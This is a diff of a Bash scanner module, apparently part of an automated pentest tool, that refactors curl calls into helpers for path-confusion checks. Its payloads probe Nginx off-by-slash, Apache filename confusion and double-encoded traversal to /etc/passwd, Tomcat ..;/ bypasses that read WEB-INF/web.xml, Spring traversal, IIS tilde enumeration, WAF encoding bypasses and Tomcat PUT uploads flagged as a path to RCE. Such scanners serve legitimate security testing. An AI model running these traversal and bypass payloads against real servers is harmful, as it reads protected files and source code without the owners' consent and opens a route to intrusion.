@@ -143,10 +143,8 @@ _try_with_waf_bypass() {
 
   # Primero intentar directo
   local DIRECT_URL="${BASE}${PLAIN_PATH}"
-  local STATUS BODY
-  STATUS=$(curl -sk --max-time 8 ${PROXY} --path-as-is \
-    -o /tmp/.waf_body_$$ -w "%{http_code}" "$DIRECT_URL" 2>/dev/null)
-  BODY=$(cat /tmp/.waf_body_$$ 2>/dev/null); rm -f /tmp/.waf_body_$$
+  _h_get "$DIRECT_URL" --path-as-is
+  local STATUS="$HTTP_LAST_STATUS" BODY="$HTTP_LAST_BODY"
 
   if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qP "$EXPECTED_BODY"; then
     echo "$DIRECT_URL"
@@ -158,10 +156,8 @@ _try_with_waf_bypass() {
     while IFS= read -r ENCODED_PATH; do
       [[ -z "$ENCODED_PATH" ]] && continue
       local BYPASS_URL="${BASE}/${ENCODED_PATH#/}"
-      local BS BB
-      BS=$(curl -sk --max-time 8 ${PROXY} --path-as-is \
-        -o /tmp/.waf_bb_$$ -w "%{http_code}" "$BYPASS_URL" 2>/dev/null)
-      BB=$(cat /tmp/.waf_bb_$$ 2>/dev/null); rm -f /tmp/.waf_bb_$$
+      _h_get "$BYPASS_URL" --path-as-is
+      local BS="$HTTP_LAST_STATUS" BB="$HTTP_LAST_BODY"
 
       if [[ "$BS" == "200" ]] && echo "$BB" | grep -qP "$EXPECTED_BODY"; then
         echo "$BYPASS_URL"
@@ -184,10 +180,10 @@ NGINX_ALIAS_DIRS=(
 # ── Detectar tecnología de un subdominio ──────────────────────
 _detect_server_tech() {
   local URL="$1"
-  local PROXY_FLAG="$2"
+  local PROXY_FLAG="$2"  # ignorado: _h_* auto-inyecta
 
-  local HEADERS
-  HEADERS=$(curl -sI --max-time 8 ${PROXY_FLAG} "$URL" 2>/dev/null)
+  _h_head "$URL"
+  local HEADERS="$HTTP_LAST_HEADERS"
 
   local SERVER
   SERVER=$(echo "$HEADERS" | grep -i "^Server:" | head -1 | tr -d '\r\n')
@@ -213,8 +209,7 @@ _detect_server_tech() {
   echo "$HEADERS" | grep -qi "X-Application-Context\|spring" && TECH="${TECH}:spring"
   # También detectar si hay actuator accesible
   local ACT_STATUS
-  ACT_STATUS=$(curl -sL --max-time 5 ${PROXY_FLAG} \
-    -o /dev/null -w "%{http_code}" "${URL}/actuator" 2>/dev/null)
+  ACT_STATUS=$(_h_status "${URL}/actuator")
   [[ "$ACT_STATUS" == "200" ]] && TECH="${TECH}:spring"
 
   echo "$TECH"
@@ -282,35 +277,24 @@ _test_nginx_off_by_slash() {
   log_info "  [Nginx off-by-slash] $BASE"
 
   # Obtener respuesta de la raíz para comparar
-  local ROOT_S ROOT_L
-  ROOT_S=$(curl -sL --max-time 8 ${PROXY} \
-    -o /tmp/.ot_root_$$ -w "%{http_code}" "${BASE}/" 2>/dev/null)
-  ROOT_L=$(wc -c < /tmp/.ot_root_$$ 2>/dev/null || echo 0)
-  rm -f /tmp/.ot_root_$$
+  _h_get "${BASE}/"
+  local ROOT_S="$HTTP_LAST_STATUS" ROOT_L="${#HTTP_LAST_BODY}"
 
   for DIR in "${NGINX_ALIAS_DIRS[@]}"; do
     # Verificar que el path base da 404 (existe pero archivo no)
     local PROBE_S
-    PROBE_S=$(curl -sL --max-time 6 ${PROXY} \
-      -o /dev/null -w "%{http_code}" \
-      "${BASE}/${DIR}/hackeadora_nonexistent_8x7z" 2>/dev/null)
+    PROBE_S=$(_h_status "${BASE}/${DIR}/hackeadora_nonexistent_8x7z")
     [[ "$PROBE_S" != "404" ]] && continue
 
     # Probar traversal /dir../
-    local TRAV_S TRAV_L
-    TRAV_S=$(curl -sL --max-time 8 ${PROXY} \
-      -o /tmp/.ot_trav_$$ -w "%{http_code}" \
-      "${BASE}/${DIR}../" 2>/dev/null)
-    TRAV_L=$(wc -c < /tmp/.ot_trav_$$ 2>/dev/null || echo 0)
-    rm -f /tmp/.ot_trav_$$
+    _h_get "${BASE}/${DIR}../"
+    local TRAV_S="$HTTP_LAST_STATUS" TRAV_L="${#HTTP_LAST_BODY}"
 
     if _responses_similar "$TRAV_S" "$TRAV_L" "$ROOT_S" "$ROOT_L" && \
        [[ "$TRAV_S" == "200" ]]; then
       # Confirmar con un recurso conocido
       local CONF_S
-      CONF_S=$(curl -sL --max-time 8 ${PROXY} \
-        -o /dev/null -w "%{http_code}" \
-        "${BASE}/${DIR}../index.html" 2>/dev/null)
+      CONF_S=$(_h_status "${BASE}/${DIR}../index.html")
       if [[ "$CONF_S" == "200" ]]; then
         _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/${DIR}../" \
           "Nginx Off-by-Slash" "high" \
@@ -338,11 +322,8 @@ _test_nginx_merge_slashes() {
        AND (url LIKE '%/api/%' OR url LIKE '%/v1/%' OR url LIKE '%/v2/%')
      LIMIT 8;" 2>/dev/null)
 
-  local ROOT_S ROOT_L
-  ROOT_S=$(curl -sL --max-time 8 ${PROXY} \
-    -o /tmp/.ot_msr_$$ -w "%{http_code}" "${BASE}/" 2>/dev/null)
-  ROOT_L=$(wc -c < /tmp/.ot_msr_$$ 2>/dev/null || echo 0)
-  rm -f /tmp/.ot_msr_$$
+  _h_get "${BASE}/"
+  local ROOT_S="$HTTP_LAST_STATUS" ROOT_L="${#HTTP_LAST_BODY}"
 
   while IFS= read -r API_URL; do
     [[ -z "$API_URL" ]] && continue
@@ -350,12 +331,8 @@ _test_nginx_merge_slashes() {
     SEG=$(echo "$API_URL" | sed 's|https\?://[^/]*||' | cut -d'/' -f2)
     [[ -z "$SEG" ]] && continue
 
-    local TRAV_S TRAV_L
-    TRAV_S=$(curl -sL --max-time 8 ${PROXY} --path-as-is \
-      -o /tmp/.ot_ms_$$ -w "%{http_code}" \
-      "${BASE}/${SEG}../" 2>/dev/null)
-    TRAV_L=$(wc -c < /tmp/.ot_ms_$$ 2>/dev/null || echo 0)
-    rm -f /tmp/.ot_ms_$$
+    _h_get "${BASE}/${SEG}../" --path-as-is
+    local TRAV_S="$HTTP_LAST_STATUS" TRAV_L="${#HTTP_LAST_BODY}"
 
     if _responses_similar "$TRAV_S" "$TRAV_L" "$ROOT_S" "$ROOT_L" && \
        [[ "$TRAV_S" == "200" ]]; then
@@ -400,14 +377,12 @@ _test_apache_confusion() {
                "/config" "/.env" "/server-status" "/phpinfo.php" \
                "/WEB-INF" "/META-INF" "/web.config" "/app.config"; do
     local S_NORMAL
-    S_NORMAL=$(curl -sL --max-time 8 ${PROXY} \
-      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}" 2>/dev/null)
+    S_NORMAL=$(_h_status "${BASE}${PPATH}")
     [[ "$S_NORMAL" != "403" && "$S_NORMAL" != "401" ]] && continue
 
     # Test con ? — Filename Confusion CVE-2024-38475
     local S_Q
-    S_Q=$(curl -sL --max-time 8 ${PROXY} \
-      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}?" 2>/dev/null)
+    S_Q=$(_h_status "${BASE}${PPATH}?")
     if [[ "$S_Q" == "200" ]]; then
       _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PPATH}?" \
         "Apache Filename Confusion — ACL Bypass" "high" \
@@ -417,8 +392,7 @@ _test_apache_confusion() {
 
     # Test con # encoded
     local S_HASH
-    S_HASH=$(curl -sL --max-time 8 ${PROXY} -g \
-      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}%23" 2>/dev/null)
+    S_HASH=$(_h_status "${BASE}${PPATH}%23" -g)
     if [[ "$S_HASH" == "200" ]]; then
       _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PPATH}%23" \
         "Apache Filename Confusion — Hash Bypass" "high" \
@@ -440,8 +414,7 @@ _test_apache_confusion() {
     for WB in "${WAF_BYPASSES[@]}"; do
       [[ -z "$WB" || "$WB" == "$PPATH" ]] && continue
       local WBS
-      WBS=$(curl -sL --max-time 8 ${PROXY} -g \
-        -o /dev/null -w "%{http_code}" "${BASE}${WB}" 2>/dev/null)
+      WBS=$(_h_status "${BASE}${WB}" -g)
       if [[ "$WBS" == "200" ]]; then
         _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${WB}" \
           "Apache ACL Bypass — WAF Encoding Bypass" "high" \
@@ -455,10 +428,8 @@ _test_apache_confusion() {
   # DocumentRoot Confusion — exposición de código fuente PHP
   for TEST in "/index.php%3F" "/index.php%3F.txt" "/config.php%3F" \
               "/index.php%252F" "/index.php%2F.txt"; do
-    local S_SRC BODY
-    S_SRC=$(curl -sL --max-time 8 ${PROXY} -g \
-      -o /tmp/.ot_src_$$ -w "%{http_code}" "${BASE}${TEST}" 2>/dev/null)
-    BODY=$(head -c 200 /tmp/.ot_src_$$ 2>/dev/null); rm -f /tmp/.ot_src_$$
+    _h_get "${BASE}${TEST}" -g
+    local S_SRC="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:200}"
 
     if [[ "$S_SRC" == "200" ]] && \
        echo "$BODY" | grep -qP '<\?php|<\?=|mysql_|PDO::|\$_GET|\$_POST'; then
@@ -478,10 +449,8 @@ _test_apache_confusion() {
     "/..%252f..%252fetc%252fpasswd"
   )
   for DE_PATH in "${DOUBLE_ENC_PATHS[@]}"; do
-    local DE_S DE_B
-    DE_S=$(curl -sk --max-time 8 ${PROXY} --path-as-is \
-      -o /tmp/.ot_de_$$ -w "%{http_code}" "${BASE}${DE_PATH}" 2>/dev/null)
-    DE_B=$(head -c 100 /tmp/.ot_de_$$ 2>/dev/null); rm -f /tmp/.ot_de_$$
+    _h_get "${BASE}${DE_PATH}" --path-as-is
+    local DE_S="$HTTP_LAST_STATUS" DE_B="${HTTP_LAST_BODY:0:100}"
     if [[ "$DE_S" == "200" ]] && echo "$DE_B" | grep -qP 'root:x:|daemon:|nobody:'; then
       _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${DE_PATH}" \
         "Apache Double-Encoded Traversal" "critical" \
@@ -531,8 +500,7 @@ _test_tomcat_semicolon() {
   for PPATH in "${PROTECTED[@]}"; do
     # Status normal (debería ser 403/404)
     local S_NORMAL
-    S_NORMAL=$(curl -sL --max-time 8 ${PROXY} \
-      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}" 2>/dev/null)
+    S_NORMAL=$(_h_status "${BASE}${PPATH}")
     [[ "$S_NORMAL" != "403" && "$S_NORMAL" != "404" ]] && continue
 
     # Construir payload ..;/ usando rutas de la app
@@ -544,11 +512,8 @@ _test_tomcat_semicolon() {
       [[ -z "$SEG" ]] && continue
 
       local PAYLOAD="${SEG}/..;${PPATH}"
-      local S_TRAV BODY_TRAV
-      S_TRAV=$(curl -sL --max-time 8 ${PROXY} -g \
-        -o /tmp/.ot_tc_$$ -w "%{http_code}" "${BASE}${PAYLOAD}" 2>/dev/null)
-      BODY_TRAV=$(head -c 500 /tmp/.ot_tc_$$ 2>/dev/null)
-      rm -f /tmp/.ot_tc_$$
+      _h_get "${BASE}${PAYLOAD}" -g
+      local S_TRAV="$HTTP_LAST_STATUS" BODY_TRAV="${HTTP_LAST_BODY:0:500}"
 
       if [[ "$S_TRAV" == "200" ]]; then
         local CONFIRM=false
@@ -589,11 +554,8 @@ _test_tomcat_semicolon() {
     "/..%ef%bc%9b/WEB-INF/web.xml"
   )
   for PAYLOAD in "${DIRECT_PAYLOADS[@]}"; do
-    local S_D BODY_D
-    S_D=$(curl -sL --max-time 8 ${PROXY} -g \
-      -o /tmp/.ot_td_$$ -w "%{http_code}" "${BASE}${PAYLOAD}" 2>/dev/null)
-    BODY_D=$(head -c 200 /tmp/.ot_td_$$ 2>/dev/null)
-    rm -f /tmp/.ot_td_$$
+    _h_get "${BASE}${PAYLOAD}" -g
+    local S_D="$HTTP_LAST_STATUS" BODY_D="${HTTP_LAST_BODY:0:200}"
 
     if [[ "$S_D" == "200" ]] && \
        echo "$BODY_D" | grep -qi "web-app\|servlet\|Manifest-Version"; then
@@ -656,11 +618,8 @@ _test_tomcat_rewrite_traversal() {
   while IFS= read -r APP_BASE; do
     [[ -z "$APP_BASE" ]] && continue
     for QPAYLOAD in "${REWRITE_PAYLOADS[@]}"; do
-      local S_R BODY_R
-      S_R=$(curl -sL --max-time 8 ${PROXY} -g \
-        -o /tmp/.ot_rv_$$ -w "%{http_code}" "${APP_BASE}${QPAYLOAD}" 2>/dev/null)
-      BODY_R=$(head -c 200 /tmp/.ot_rv_$$ 2>/dev/null)
-      rm -f /tmp/.ot_rv_$$
+      _h_get "${APP_BASE}${QPAYLOAD}" -g
+      local S_R="$HTTP_LAST_STATUS" BODY_R="${HTTP_LAST_BODY:0:200}"
 
       if [[ "$S_R" == "200" ]] && \
          echo "$BODY_R" | grep -qi "web-app\|servlet"; then
@@ -673,20 +632,15 @@ _test_tomcat_rewrite_traversal() {
   done <<< "$APP_BASES"
 
   # También verificar si PUT está habilitado (escala a RCE)
-  local PUT_S
-  PUT_S=$(curl -sL --max-time 8 ${PROXY} \
-    -X PUT \
-    -d "test" \
-    -o /dev/null -w "%{http_code}" \
-    "${BASE}/hackeadora_put_test_$$" 2>/dev/null)
+  _h_method "PUT" "${BASE}/hackeadora_put_test_$$" --data "test"
+  local PUT_S="$HTTP_LAST_STATUS"
   if [[ "$PUT_S" == "201" || "$PUT_S" == "200" ]]; then
     _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
       "Tomcat HTTP PUT habilitado" "high" \
       "PUT habilitado — combinado con CVE-2025-55752 puede llevar a RCE" \
       "tomcat_put_enabled"
     # Limpiar el archivo de test
-    curl -sL --max-time 5 ${PROXY} \
-      -X DELETE "${BASE}/hackeadora_put_test_$$" 2>/dev/null || true
+    _h_method "DELETE" "${BASE}/hackeadora_put_test_$$" 2>/dev/null || true
   fi
 }
 
@@ -725,11 +679,8 @@ _test_spring_traversal() {
     "/webjars/../../../etc/passwd"
   )
   for PAYLOAD in "${SPRING_PAYLOADS[@]}"; do
-    local S_SP BODY_SP
-    S_SP=$(curl -sL --max-time 8 ${PROXY} -g \
-      -o /tmp/.ot_sp_$$ -w "%{http_code}" "${BASE}${PAYLOAD}" 2>/dev/null)
-    BODY_SP=$(head -c 100 /tmp/.ot_sp_$$ 2>/dev/null)
-    rm -f /tmp/.ot_sp_$$
+    _h_get "${BASE}${PAYLOAD}" -g
+    local S_SP="$HTTP_LAST_STATUS" BODY_SP="${HTTP_LAST_BODY:0:100}"
 
     if [[ "$S_SP" == "200" ]] && \
        echo "$BODY_SP" | grep -qP 'root:x:|daemon:|nobody:'; then
@@ -762,17 +713,15 @@ _test_iis_tilde() {
   log_info "  [IIS tilde short-name] $BASE"
 
   # Verificar que IIS está presente
-  local HEADERS
-  HEADERS=$(curl -sk --max-time 8 ${PROXY} -I "${BASE}/" 2>/dev/null)
+  _h_head "${BASE}/"
+  local HEADERS="$HTTP_LAST_HEADERS"
   echo "$HEADERS" | grep -qi "^Server:.*IIS\|^X-Powered-By:.*ASP" || return
 
   # Sonda básica: respuesta diferente para letra existente vs no existente
   # Si GET /*~1*/  devuelve 404 y GET /zzz*~1*/ devuelve 400 → vulnerable
   local S_WILD S_NOWILD
-  S_WILD=$(curl -sk --max-time 8 ${PROXY} -g \
-    -o /dev/null -w "%{http_code}" "${BASE}/*~1*/" 2>/dev/null)
-  S_NOWILD=$(curl -sk --max-time 8 ${PROXY} -g \
-    -o /dev/null -w "%{http_code}" "${BASE}/zzzzzzzz~1*/" 2>/dev/null)
+  S_WILD=$(_h_status "${BASE}/*~1*/" -g)
+  S_NOWILD=$(_h_status "${BASE}/zzzzzzzz~1*/" -g)
 
   if [[ "$S_WILD" == "404" && "$S_NOWILD" == "400" ]]; then
     _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
@@ -785,8 +734,7 @@ _test_iis_tilde() {
     for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z \
                 0 1 2 3 4 5 6 7 8 9 _ -; do
       local S_CHAR
-      S_CHAR=$(curl -sk --max-time 5 ${PROXY} -g \
-        -o /dev/null -w "%{http_code}" "${BASE}/${CHAR}*~1*/" 2>/dev/null)
+      S_CHAR=$(_h_status "${BASE}/${CHAR}*~1*/" -g)
       [[ "$S_CHAR" == "404" ]] && FOUND_NAMES+=("${CHAR}*")
     done
 
@@ -802,11 +750,9 @@ _test_iis_tilde() {
   # Algunos WAF filtran ~ pero no %7e
   if [[ "$S_WILD" != "404" ]]; then
     local S_ENC
-    S_ENC=$(curl -sk --max-time 8 ${PROXY} -g \
-      -o /dev/null -w "%{http_code}" "${BASE}/*%7e1*/" 2>/dev/null)
+    S_ENC=$(_h_status "${BASE}/*%7e1*/" -g)
     local S_NO_ENC
-    S_NO_ENC=$(curl -sk --max-time 8 ${PROXY} -g \
-      -o /dev/null -w "%{http_code}" "${BASE}/zzzzzzzz%7e1*/" 2>/dev/null)
+    S_NO_ENC=$(_h_status "${BASE}/zzzzzzzz%7e1*/" -g)
     if [[ "$S_ENC" == "404" && "$S_NO_ENC" == "400" ]]; then
       _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
         "IIS Tilde Short-Name — WAF Bypass (%7e)" "medium" \
@@ -827,6 +773,8 @@ module_run() {
   log_phase "Módulo 26 — $MODULE_DESC: $DOMAIN"
 
   source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
+  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
+  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true
   proxy_check
   local CURL_PROXY=""
   $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"
@@ -849,6 +797,12 @@ module_run() {
     [[ -z "$SUB" ]] && continue
     ((CHECKED++))
     local BASE="https://${SUB}"
+
+    # Bug #13: skip catch-all hosts upfront. Cualquier ..;/ devolverá 200 con SPA shell o 30x con WAF.
+    if is_catchall_host "$BASE" 2>/dev/null; then
+      log_info "[$CHECKED] $BASE — catch-all detectado, skip path_confusion"
+      continue
+    fi
 
     # ── Detectar tecnología del subdominio ─────────────────
     # Primero desde la DB (módulo 10 ya lo hizo)
